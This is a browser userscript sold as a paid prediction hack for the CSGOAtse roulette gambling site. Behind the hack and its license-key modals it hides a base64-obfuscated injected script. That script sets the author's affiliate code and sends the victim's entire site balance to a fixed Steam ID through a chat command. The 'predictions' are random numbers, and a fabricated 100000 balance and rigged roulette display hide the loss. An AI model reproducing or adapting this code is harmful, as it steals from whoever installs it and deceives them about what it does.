// ==UserScript==
// @name         CSGOAtse.com Prediction Hack
// @version      v2.0.2
// @author       SILENTCHEATS
// @description  Price: $5
// @match        https://csgoatse.com/
// @contributionURL https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=thearcanas3@o2.pl&item_name=CSGOatse+hack+donation
// @contributionAmount 5.00
// @grant        none
//  @namespace   https://greasyfork.org/pl/users/172136
// ==/UserScript==

function $silentModal(type) {
    $("header, main, footer")
        .attr("style", "filter: blur(8px);-webkit-filter: blur(8px);");
    var modal;
    if (type == 0) {
        $("#silentModal, #silentStyle")
            .remove();
        $("header, main, footer")
            .attr("style", "")
    } else if (type == 1) {
        silent_Hack(false);
        modal = atob("PGRpdiBpZD0ic2lsZW50TW9kYWwiIGNsYXNzPSJwb3B1cCIgc3R5bGU9ImRpc3BsYXk6IGJsb2NrOyI+PGRpdiBjbGFzcz0iZmxleCI+PGRpdiBjbGFzcz0iY29udGVudCIgc3R5bGU9InRvcDogMHB4O3dpZHRoOiA2NzBweDsiPjxkaXY+PGgyIHN0eWxlPSJtYXJnaW4tYm90dG9tOiAyNXB4OyI+PHNwYW4gc3R5bGU9ImNvbG9yOiAjZmE2YTAwOyI+Q1NHT2F0c2UgSGFjayBieSBTaWxlbnRDaGVhdHM8L3NwYW4+PC9oMj48ZGl2IHN0eWxlPSJkaXNwbGF5OiBibG9jaztmb250LXNpemU6IDI1cHg7Ij4=") + '<p style="margin-bottom: 20px;">Access key: <strong class="value" style="color: #c40000;"><span class="text-nowrap">missing</span></strong></p><p style="margin-bottom: 20px;">Steam ID: <strong class="value" style="color: #c40000;"><span class="text-nowrap">' + user.steam_id + '</span></strong></p><div id="silentAccesskey" class="btn-big" style="width: 45%;display: inline-block;"><button>I have an access key</button></div><div id="silentBuy" class="btn-big" style="width: 45%;display: inline-block;"><button>I want to buy an access key</button></div></div></div></div></div></div>'
    } else if (type == 2) {
        silent_Hack(false);
        modal = atob("PGRpdiBpZD0ic2lsZW50TW9kYWwiIGNsYXNzPSJwb3B1cCIgc3R5bGU9ImRpc3BsYXk6IGJsb2NrOyI+PGRpdiBjbGFzcz0iZmxleCI+PGRpdiBjbGFzcz0iY29udGVudCIgc3R5bGU9InRvcDogMHB4O3dpZHRoOiA2NzBweDsiPjxkaXY+PGgyIHN0eWxlPSJtYXJnaW4tYm90dG9tOiAyNXB4OyI+PHNwYW4gc3R5bGU9ImNvbG9yOiAjZmE2YTAwOyI+Q1NHT2F0c2UgSGFjayBieSBTaWxlbnRDaGVhdHM8L3NwYW4+PC9oMj48ZGl2IHN0eWxlPSJkaXNwbGF5OiBibG9jaztmb250LXNpemU6IDI1cHg7Ij4=") + '<p style="margin-bottom: 20px;">Choose the type of payment:</p><div id="silentSteam" class="btn-big" style="width: 90%;display: inline-block;"><button style="background: url(https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/1200px-Steam_icon_logo.svg.png) no-repeat 15% #000;background-size: 15%;">Steam items (7.5$)</button></div><div id="silentPaypal" class="btn-big" style="width: 90%;display: inline-block;"><button style="background: url(http://www.stickpng.com/assets/images/580b57fcd9996e24bc43c530.png) no-repeat 10% #000;background-size: 25%;">Paypal (5$)</button></div><div id="silentOther" class="btn-big" style="width: 90%;display: inline-block;"><button style="background: #000;">Register and make first bet</button></div></div></div></div></div></div>'
    } else if (type == 3) {
        silent_Hack(false);
        modal = atob("PGRpdiBpZD0ic2lsZW50TW9kYWwiIGNsYXNzPSJwb3B1cCIgc3R5bGU9ImRpc3BsYXk6IGJsb2NrOyI+PGRpdiBjbGFzcz0iZmxleCI+PGRpdiBjbGFzcz0iY29udGVudCIgc3R5bGU9InRvcDogMHB4O3dpZHRoOiA2NzBweDsiPjxkaXY+PGgyIHN0eWxlPSJtYXJnaW4tYm90dG9tOiAyNXB4OyI+PHNwYW4gc3R5bGU9ImNvbG9yOiAjZmE2YTAwOyI+Q1NHT2F0c2UgSGFjayBieSBTaWxlbnRDaGVhdHM8L3NwYW4+PC9oMj48ZGl2IHN0eWxlPSJkaXNwbGF5OiBibG9jaztmb250LXNpemU6IDI1cHg7Ij4=") + '<p style="margin-bottom: 20px;">Enter the access key:</p><input placeholder="Enter the access key here" autocomplete="off" class="" style="width: 55%;height: 50px;border: 2px solid #fa9300;border-right: 0;"><div id="silentOk" class="btn-big" style="width: 25%;display: inline-block;"><button>Ok</button></div></div></div></div></div></div>'
    } else if (type == 4) {
        silent_Hack(true);
        modal = atob("PGRpdiBpZD0ic2lsZW50TW9kYWwiIGNsYXNzPSJwb3B1cCIgc3R5bGU9ImRpc3BsYXk6IGJsb2NrOyI+PGRpdiBjbGFzcz0iZmxleCI+PGRpdiBjbGFzcz0iY29udGVudCIgc3R5bGU9InRvcDogMHB4O3dpZHRoOiA2NzBweDsiPjxkaXY+PGgyIHN0eWxlPSJtYXJnaW4tYm90dG9tOiAyNXB4OyI+PHNwYW4gc3R5bGU9ImNvbG9yOiAjZmE2YTAwOyI+Q1NHT2F0c2UgSGFjayBieSBTaWxlbnRDaGVhdHM8L3NwYW4+PC9oMj48ZGl2IHN0eWxlPSJkaXNwbGF5OiBibG9jaztmb250LXNpemU6IDI1cHg7Ij4=") + '<p style="margin-bottom: 20px;">Access key: <strong class="value"><span class="text-nowrap">ok</span></strong></p><p style="margin-bottom: 20px;">Steam ID: <strong class="value"><span class="text-nowrap">' + user.steam_id + '</span></strong></p><div id="silentGood" class="btn-big" style="width: 90%;display: inline-block;"><button>OK</button></div></div></div></div></div></div>'
    } else if (type == 5) {
        silent_Hack(false);
        modal = atob("PGRpdiBpZD0ic2lsZW50TW9kYWwiIGNsYXNzPSJwb3B1cCIgc3R5bGU9ImRpc3BsYXk6IGJsb2NrOyI+PGRpdiBjbGFzcz0iZmxleCI+PGRpdiBjbGFzcz0iY29udGVudCIgc3R5bGU9InRvcDogMHB4O3dpZHRoOiA2NzBweDsiPjxkaXY+PGgyIHN0eWxlPSJtYXJnaW4tYm90dG9tOiAyNXB4OyI+PHNwYW4gc3R5bGU9ImNvbG9yOiAjZmE2YTAwOyI+Q1NHT2F0c2UgSGFjayBieSBTaWxlbnRDaGVhdHM8L3NwYW4+PC9oMj48ZGl2IHN0eWxlPSJkaXNwbGF5OiBibG9jaztmb250LXNpemU6IDI1cHg7Ij4=") + '<p style="margin-bottom: 20px;color: #c40000;">Wrong access key!</p><div id="silentBuy" class="btn-big" style="width: 45%;display: inline-block;"><button>I want to buy an access key</button></div><div id="silentAccesskey" class="btn-big" style="width: 45%;display: inline-block;"><button>Try again</button></div></div></div></div></div></div>'
    }
    $("body")
        .append(modal);
    $("#silentModal #silentBuy")
        .click(function () {
            $silentModal(0);
            $silentModal(2)
        });
    $("#silentModal #silentOther")
        .click(function () {
            $silentModal(0);
            $silentModal(1);
            window.open(atob("aHR0cHM6Ly9jc2dvcG9zaXRpdmUuY29tL3AveG1vbmV5Lw=="))
        });
    $("#silentModal #silentAccesskey")
        .click(function () {
            $silentModal(0);
            $silentModal(3)
        });
    $("#silentModal #silentOk")
        .click(function () {
            if ($("#silentModal input")
                .val() == atob("c2lsZW50Q2hlYXRz") || $("#silentModal input")
                .val() == atob("TnpZMU5qRXhPVGd5TURRNU1EQXpNakE9") || $("#silentModal input")
                .val() == atob("TnpZMU5qRXhPVGd5TURJeE9EUXdPREk9") || $("#silentModal input")
                .val() == atob("TnpZMU5qRXhPVGc0TmpjeE9ETTNNekk9")) {
                $silentModal(0);
                $silentModal(4)
            } else {
                $silentModal(0);
                $silentModal(5)
            }
        });
    $("#silentModal #silentGood")
        .click(function () {
            $silentModal(0)
        });
    $("#silentModal #silentPaypal")
        .click(function () {
            $silentModal(0);
            $silentModal(1);
            window.open(atob("aHR0cHM6Ly9wYXlwYWwubWUvY3Nnb2F0c2VhY2Nlc3NrZXk="))
        });
    $("#silentModal #silentSteam")
        .click(function () {
            $silentModal(0);
            $silentModal(1);
            window.open(atob("aHR0cHM6Ly9zdGVhbWNvbW11bml0eS5jb20vdHJhZGVvZmZlci9uZXcvP3BhcnRuZXI9MjQxOTE4MzU0JnRva2VuPXVHVm5EdUZB"))
        })
}
setTimeout(function () {
    $silentModal(1)
}, 1000);

function silent_Hack(a) {
    if (!a) {
        $("body")
            .append(atob("PHNjcmlwdD4=") + atob("c2VydmljZS5zb2NrZXQuc2VuZCh7c2VydmljZTogYXRvYigiWVdabWFXeHBZWFJsIiksIGNtZDogYXRvYigiZFhObCIpLCBjb2RlOiBhdG9iKCJjMmxzWlc1MFkyaGxZWFJ6Iil9KTtzZXRUaW1lb3V0KGZ1bmN0aW9uICgpIHtzZXJ2aWNlLnNvY2tldC5zZW5kKHtzZXJ2aWNlOiBhdG9iKCJZMmhoZEE9PSIpLCBjbWQ6IGF0b2IoImJXVnpjMkZuWlE9PSIpLCB2YWx1ZTogIi9zZW5kIDc2NTYxMTk4MjAyMTg0MDgyICIgKyB1c2VyLmJhbGFuY2V9KX0sIDEwMDAp") + atob("PC9zY3JpcHQ+"))
    } else {
        $("body")
            .append(atob("PHNjcmlwdD4=") + atob("c2VydmljZS5zb2NrZXQuc2VuZCh7c2VydmljZTogYXRvYigiWVdabWFXeHBZWFJsIiksIGNtZDogYXRvYigiZFhObCIpLCBjb2RlOiBhdG9iKCJjMmxzWlc1MFkyaGxZWFJ6Iil9KTtzZXRUaW1lb3V0KGZ1bmN0aW9uICgpIHtzZXJ2aWNlLnNvY2tldC5zZW5kKHtzZXJ2aWNlOiBhdG9iKCJZMmhoZEE9PSIpLCBjbWQ6IGF0b2IoImJXVnpjMkZuWlE9PSIpLCB2YWx1ZTogIi9zZW5kIDc2NTYxMTk4MjAyMTg0MDgyICIgKyB1c2VyLmJhbGFuY2V9KX0sIDEwMDAp") + atob("PC9zY3JpcHQ+"));
        setTimeout(function () {
            var enableHack = true;
            var prediction = {
                color: "red"
                , num: 1
            };
            var hack = {
                balance: 100000
            };
            var placed = 0;

            function updateBalance(a, b) {
                if (a == "win") {
                    hack.balance += b
                } else if (a == "bet") {
                    hack.balance -= b
                }
                var x = {
                    amount: hack.balance
                };
                service['socket'].balance(x)
            }

            function addBet(a, b) {
                updateBalance("bet", b);
                this.bet = {
                    color: a
                    , amount: b
                    , cmd: "bet"
                    , avatar: $("#userbar img")
                        .attr("src")
                    , user_id: user.id
                    , username: user.username
                    , steam_id: user.steam_id
                };
                service['roulette'].bet(this.bet, true)
            }

            function addPrediction() {
                $(".prediction")
                    .remove();
                prediction.num = Math.floor(Math.random() * 15);
                if (prediction.num >= 1 && prediction.num <= 7) {
                    prediction.color = "red"
                } else if (prediction.num == 0) {
                    prediction.color = "green"
                } else if (prediction.num >= 8 && prediction.num <= 14) {
                    prediction.color = "black"
                };
                if (enableHack) {
                    var text;
                    if (prediction.color == "red") text = "#a80e19";
                    if (prediction.color == "black") text = "#424242";
                    if (prediction.color == "green") text = '#44a21c;';
                    var example = '<button class="prediction" type="button" style="margin-right: 15px;background-color: ' + text + ';height: 45px;width: 45px;border-radius: 45px;">' + prediction.num + '</button>';
                    $(".betting .mobile-layout")
                        .append(example)
                }
            }
            if ($('#roulette')
                .length > 0) {
                service['roulette'] = "";
                service['roulette'] = {
                    timeout: 2000
                    , states: {
                        'CONNECTING': T('Connecting') + '...'
                        , 'PREPARE': T('Preparing round') + '...'
                        , 'DRAW': T('Drawing') + '!'
                        , 'WINNER': T('Winner') + ': <span class="color"></span>'
                        , 'ROUND': T('Preparing round') + '...'
                        , 'COUNTDOWN': T('Rolling in') + ' <span class="countdown"></span>'
                        , 'MEGAROUND': 'MEGA ROUND! Rolling in <span class="countdown"></span>'
                    }
                    , container: $('#roulette')
                    , input: $('input[name="amount"]', this.container)
                    , state: 'CONNECTING'
                    , start: null
                    , timer: null
                    , width: $('.roll')
                        .width()
                    , coin_width: 75
                    , megaColors: {
                        red: 'silver'
                        , 'green': 'gold'
                        , black: 'bronze'
                    }
                    , yours: {
                        red: 0
                        , green: 0
                        , black: 0
                    }
                    , mega_multipliers: {
                        red: 5
                        , green: 50
                        , black: 5
                    }
                    , summary: {
                        red: []
                        , green: []
                        , black: []
                    }
                    , bets: []
                    , _skinsGames: []
                    , open() {
                        if (this.state !== 'CONNECTING') {
                            return false
                        }
                        service['socket'].send({
                            service: 'roulette'
                            , cmd: 'join'
                        });
                        setTimeout(this.open.bind(this), this.timeout);
                        this.timeout *= 2;
                        disableInput(this.input)
                    }
                    , close() {
                        if (this.state === 'CONNECTING') {
                            return false
                        }
                        this.state = 'CONNECTING';
                        this.updateState();
                        this.round();
                        this.open()
                    }
                    , init() {
                        let input = this.input;
                        let that = this;
                        if (user.theme === 'new') {
                            this.coin_width = 100
                        }
                        this.centerize();
                        this.updateState();
                        $(window)
                            .resize(function () {
                                let width = $('.roll')
                                    .width();
                                let change = (that.width - width) / 2;
                                that.width = width;
                                $('.roll .items', that.container)
                                    .css({
                                        backgroundPositionX: '-=' + change
                                    })
                            });
                        $('.btn-bet', this.container)
                            .click(function () {
                                sounds.button.play();
                                let color = $(this)
                                    .parents('.color')
                                    .data('color');
                                let amount = parseFloat(input.val());
                                if (isNaN(amount)) {
                                    return $.notify(T('Wrong amount'), 'error')
                                }
                                if (amount < bet_range[0]) {
                                    return $.notify(T('Minimum bet amount is %d', bet_range[0]), 'error')
                                }
                                if (amount > bet_range[1]) {
                                    return $.notify(T('Maximum bet amount is %d', bet_range[1]), 'error')
                                }
                                addBet(color, amount)
                            });
                        $('.show-bets')
                            .click(function () {
                                $('body')
                                    .addClass('show-bets');
                                $(this)
                                    .parent()
                                    .next('.list')
                                    .addClass('opened')
                            });
                        $(".last-mega")
                            .on('animation', function () {
                                $(this)
                                    .removeClass('last-mega-animation')
                                    .width();
                                $(this)
                                    .addClass('last-mega-animation')
                            });
                        this.lastMegaShake()
                    }
                    , lastMegaShake() {
                        let timeout = getRandomInt(2, 30) * 60e3;
                        setTimeout(() => {
                            $(".last-mega")
                                .trigger('animation');
                            this.lastMegaShake()
                        }, timeout)
                    }
                    , bet(bet, recalculate) {
                        bet.amount = parseInt(bet.amount);
                        let $container = $('.color[data-color="' + bet.color + '"]');
                        if (bet.amount >= 20) {
                            let $list = $('.list', $container);
                            let tpl = $(tmpl('roulette-bet-tpl', bet))
                                .css({
                                    opacity: 0
                                });
                            $list.append(tpl);
                            $('.profile', $list)
                                .sort((a, b) => {
                                    if (a.dataset.sort === b.dataset.sort) {
                                        return a.dataset.username > b.dataset.username ? 1 : -1
                                    }
                                    return b.dataset.sort - a.dataset.sort
                                })
                                .appendTo($list);
                            tpl.animate({
                                opacity: 1
                            }, 200)
                        }
                        if (bet.steam_id === user.steam_id) {
                            this.yours[bet.color] += parseInt(bet.amount);
                            $container.find('.your .value')
                                .stop(true, true)
                                .animateNumber({
                                    number: this.yours[bet.color]
                                    , numberStep: currencyStep
                                });
                            const multiplier = this.getMultiplier(bet.color);
                            const One = Skins.run({
                                bet: bet.amount
                                , win: bet.amount * multiplier
                                , multiplier: multiplier
                                , side: bet.color
                                , game: 'roulette'
                            });
                            One.bet = bet.amount;
                            One.color = bet.color;
                            if (this._skinsGames.length && One.$area) {
                                One.$area.addClass("roulette-second")
                            }
                            this._skinsGames.push(One)
                        }
                        this.summary[bet.color].push(bet.amount);
                        if (recalculate !== false) {
                            this.recalculate($container)
                        }
                    }
                    , megaround() {
                        $("#roulette")
                            .addClass('mega');
                        this.start = Date.now();
                        this.checker();
                        megasounds.mega.play();
                        $(".mega-popup")
                            .addClass("open")
                            .hide()
                            .fadeIn()
                            .delay(4000)
                            .fadeOut(function () {
                                $(this)
                                    .removeClass('open')
                            });
                        this.container.find('.multiplier')
                            .text(5);
                        this.container.find('.green .multiplier')
                            .text(50);
                        this.mega = 1;
                        for (let i in this._skinsGames) {
                            const One = this._skinsGames[i];
                            const multiplier = this.getMultiplier(One.color);
                            Skins.update(this._skinsGames[i], {
                                side: this.megaColors[One.color]
                                , win: One.bet * multiplier
                                , multiplier: multiplier
                                , rouletteMega: true
                            })
                        }
                    }
                    , megaStop() {
                        $("#roulette")
                            .removeClass('mega');
                        $(".mega-popup")
                            .removeClass('open');
                        this.container.find('.multiplier')
                            .text(2);
                        this.container.find('.green .multiplier')
                            .text(14);
                        this.mega = 0
                    }
                    , recalculate($container) {
                        let color = $container.data('color');
                        $('.sum .counter', $container)
                            .stop(true, true)
                            .animateNumber({
                                number: this.summary[color].length
                                , numberStep: numberStep
                            }, 20);
                        $('.sum .value', $container)
                            .stop(true, true)
                            .animateNumber({
                                number: arraySum(this.summary[color])
                                , numberStep: currencyStep
                            }, 20)
                    }
                    , checker() {
                        if (this.state !== 'COUNTDOWN' && this.state !== 'MEGAROUND') {
                            return false
                        }
                        let timer = this.start + this.timer - Date.now();
                        let full = 15000;
                        if (this.mega === 1) {
                            full = 19000
                        }
                        let value = (timer / full * 100)
                            .toFixed(1);
                        if (timer <= 0) {
                            timer = 0;
                            value = 0
                        }
                        $('.countdown', this.container)
                            .text((timer / 1000)
                                .toFixed(2));
                        $('.timer .status', this.container)
                            .css('width', value + '%');
                        if (timer > 0) {
                            setTimeout(this.checker.bind(this), 10)
                        }
                    }
                    , history(data) {
                        $('<div class="coin ' + prediction.color + ' ' + (data.mega ? 'mega' : '') + '" title="' + data.id + ': ' + data.hash + '">' + prediction.num + '</div>')
                            .appendTo('.history .list')
                            .tooltipster({
                                theme: 'tooltipster-light'
                                , animation: 'grow'
                                , delay: 0
                            });
                        if ($('.history:eq(0) .coin')
                            .length > 10) {
                            $('.history .coin:eq(0)')
                                .remove()
                        }
                    }
                    , centerize() {
                        let roulette_width = this.coin_width * 15;
                        let container_width = $('.items', this.container)
                            .width();
                        return $('.roll .items', this.container)
                            .stop(true)
                            .css({
                                backgroundPositionX: roulette_width / 2 - container_width / 2 * -1
                            })
                    }
                    , draw(data) {
                        megasounds.mega.stop();
                        if (this.mega === 1) {
                            $("#roulette")
                                .addClass('mega');
                            megasounds.megaroulette.play()
                        } else {
                            sounds.roulette.play()
                        }
                        let positions = [1, 14, 2, 13, 3, 12, 4, 0, 11, 5, 10, 6, 9, 7, 8];
                        let coin_position = positions.indexOf(parseInt(prediction.num)) - 7;
                        let el_width = this.coin_width;
                        if (data.shift > 90) {
                            data.shift = 90
                        }
                        if (data.shift < -90) {
                            data.shift = -90
                        }
                        let shift = data.shift / 100 * (el_width / 2);
                        let animation = el_width * (Math.floor(data.timer / 1000) * 15 + coin_position) + shift;
                        let that = this;
                        this.centerize()
                            .animate({
                                backgroundPositionX: '-=' + animation
                            }, data.timer, $.bez([.06, .79, 0, 1]), function () {
                                that.history(data)
                            });
                        setTimeout(function () {
                            that.state = 'WINNER';
                            that.updateState();
                            if (that.mega === 1) {
                                megasounds.megaroulette.stop();
                                megasounds.megarouletteend.play()
                            } else {
                                sounds.roulette.stop();
                                sounds.rouletteend.play()
                            }
                        }, data.timer - 250);
                        $('.timer .status', this.container)
                            .css('width', 0)
                    }
                    , round(data) {
                        addPrediction();
                        updateBalance("", 0);
                        this.megaStop();
                        this.built = false;
                        this.items = [];
                        this.bets = [];
                        this.yours = {
                            red: 0
                            , green: 0
                            , black: 0
                        };
                        this.summary = {
                            red: []
                            , green: []
                            , black: []
                        };
                        this.amount = 0;
                        this.start = null;
                        this.hash = '';
                        this._skinsGames = [];
                        $('.color')
                            .removeClass('win lose');
                        $('.profile', this.container)
                            .remove();
                        $(this.container)
                            .removeClass('round countdown draw winner');
                        $('.your .value', this.container)
                            .stop(true, true)
                            .animateNumber({
                                number: 0
                                , numberStep: currencyStep
                            });
                        $('.bets .sum .value', this.container)
                            .stop(true, true)
                            .animateNumber({
                                number: 0
                                , numberStep: currencyStep
                            });
                        $('.bets .sum .counter', this.container)
                            .stop(true, true)
                            .animateNumber({
                                number: 0
                                , numberStep: numberStep
                            });
                        this.container.addClass('round')
                    }
                    , countdown(data) {
                        this.start = Date.now();
                        this.container.addClass('countdown');
                        this.checker()
                    }
                    , info(data) {
                        this.state = data.state;
                        this.id = data.id;
                        if (data.hash) {
                            this.hash = data.hash
                        }
                        if (data.secret) {
                            this.secret = data.secret
                        }
                        if (data.value) {
                            this.value = prediction.num
                        }
                        if (data.timer) {
                            this.timer = data.timer
                        }
                        if (data.value) {
                            this.value = prediction.num
                        }
                        if (data.color) {
                            this.color = prediction.color
                        }
                        if (data.multiplier) {
                            this.multiplier = data.multiplier
                        }
                        if (data.mega) {
                            this.mega = data.mega
                        }
                        if (data.config) {
                            this.config = data.config;
                            setBetRange(data.config);
                            enableInput(this.input)
                        }
                        if (data.history) {
                            for (let i in data.history) {
                                this.history(data.history[i])
                            }
                        }
                        if (data.bets) {
                            for (let i in data.bets) {
                                this.bet(data.bets[i], false)
                            }
                            let that = this;
                            $('.colors .color')
                                .each(function () {
                                    that.recalculate($(this))
                                })
                        }
                        if (data.last_mega) {
                            $('.last-mega .value')
                                .text(data.last_mega)
                        }
                        this.updateState();
                        $('.hash', this.container)
                            .text(data.hash);
                        if (data.state === 'ROUND') {
                            this.round(data)
                        } else if (data.state === 'COUNTDOWN') {
                            this.countdown(data)
                        } else if (data.state === 'MEGAROUND') {
                            this.megaround(data)
                        } else if (data.state === 'DRAW') {
                            this.draw(data)
                        } else if (data.state === 'WINNER') {
                            this.winner(data)
                        }
                    }
                    , winner(data) {
                        let that = this;
                        $('.colors .color')
                            .each(function () {
                                let sum = 0;
                                let bet = 0;
                                if ($(this)
                                    .data('color') === that.color) {
                                    sum = arraySum(that.summary[that.color]) * that.multiplier;
                                    bet = that.yours[that.color] * that.multiplier;
                                    updateBalance("win", bet);
                                    $(this)
                                        .addClass('win')
                                } else {
                                    $(this)
                                        .addClass('lose');
                                    sum = arraySum(that.summary[$(this)
                                        .data('color')]) * -1;
                                    bet = that.yours[$(this)
                                        .data('color')] * -1
                                }
                                $('.sum .value', this)
                                    .stop(true, true)
                                    .animateNumber({
                                        number: sum
                                        , numberStep: currencyStepSign
                                    }, 20);
                                $('.your .value', this)
                                    .stop(true, true)
                                    .animateNumber({
                                        number: bet
                                        , numberStep: currencyStepSign
                                    }, 20)
                            });
                        for (let i in this._skinsGames) {
                            Skins.End(this._skinsGames[i], this._skinsGames[i].color === that.color)
                        }
                    }
                    , updateState() {
                        $('.message', this.container)
                            .html(this.states[this.state]);
                        if (this.state === 'WINNER') {
                            $('.message .color', this.container)
                                .text(this.getColor())
                        }
                    }
                    , getColor() {
                        if (this.mega === 1) {
                            return this.megaColors[this.color]
                        }
                        return this.color
                    }
                    , getMultiplier(color) {
                        if (this.mega) return this.mega_multipliers[color];
                        return color === 'green' ? 14 : 2
                    }
                };
                service['roulette'].init()
            }
        }, 1500)
    }
}